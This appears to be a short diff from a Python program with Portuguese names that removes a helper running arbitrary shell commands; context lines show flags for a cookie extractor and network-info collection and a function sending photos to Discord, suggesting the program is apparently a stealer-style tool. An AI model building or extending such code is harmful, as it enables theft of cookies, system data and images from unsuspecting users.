@@ -48,12 +48,6 @@ executou_cookie_extractor = False
 executou_network_info = False
 executou_alerta = False
 
-def executar_comando(comando):
-    try:
-        resultado = subprocess.check_output(comando, shell=True, text=True)
-        return resultado
-    except subprocess.CalledProcessError as e:
-        return f"Erro ao executar o comando: {e}"
 
 def enviar_imagem_para_discord(caminho_foto):
     with open(caminho_foto, 'rb') as imagem:
